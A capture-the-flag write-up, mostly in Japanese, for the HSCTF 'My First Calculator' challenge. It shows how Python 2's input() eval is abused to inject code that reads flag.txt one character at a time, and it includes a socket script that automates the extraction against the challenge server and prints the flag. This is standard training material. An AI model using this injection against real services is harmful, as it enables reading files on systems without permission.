# My First Calculator:Miscellaneous:100pts
I'm really new to python. Please don't break my calculator!  
nc misc.hsctf.com 7001  
There is a flag.txt on the server.  
[calculator.py](calculator.py)  

# Solution
calculator.pyをみるとpython2.7との記述がある。  
python2ではinputが即座に評価されるため、ファイルを読み込むことができる。  
`open("flag.txt").read()`ではstringであるため表示できない。  
`ord(open("flag.txt").read()[i])`のiを増やし、一文字ずつ読んだ後デコードすればよい。  
```bash
$ echo TestFlag > flag.txt
$ python2 calculator.py
Welcome to my calculator!
You can add, subtract, multiply and divide some numbers

First number: 9*9*9*9
Second number: 0
Operation (+ - * /): 0

Sorry, only the number 1 is supported
6561
$ python2 calculator.py
Welcome to my calculator!
You can add, subtract, multiply and divide some numbers

First number: ord(open("flag.txt").read()[0])
Second number: 0
Operation (+ - * /): +

Sorry, only the number 1 is supported
84
$ python -c "print(chr(84))"
T
```
手動で行ってもよいがcharf.pyで自動化する。  
```python:charf.py
import re
import socket

host = "misc.hsctf.com"
port = 7001

FLAG_MAX = 50

for i in range(FLAG_MAX):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    _ = client.recv(128)
    _ = client.recv(128)
    client.send("ord(open(\"flag.txt\").read()[{}])\n".format(i).encode("utf-8"))
    _ = client.recv(128)
    client.send(b"0\n")
    _ = client.recv(128)
    client.send(b"+\n")
    _ = client.recv(128)
    response = client.recv(128)
    try:
        response = re.findall("[0-9]*", str(response))
        print(chr(int(response[41])),end="")
    except:
        break
```
```bash
$ python chrf.py
flag{please_use_python3}
```

## flag{please_use_python3}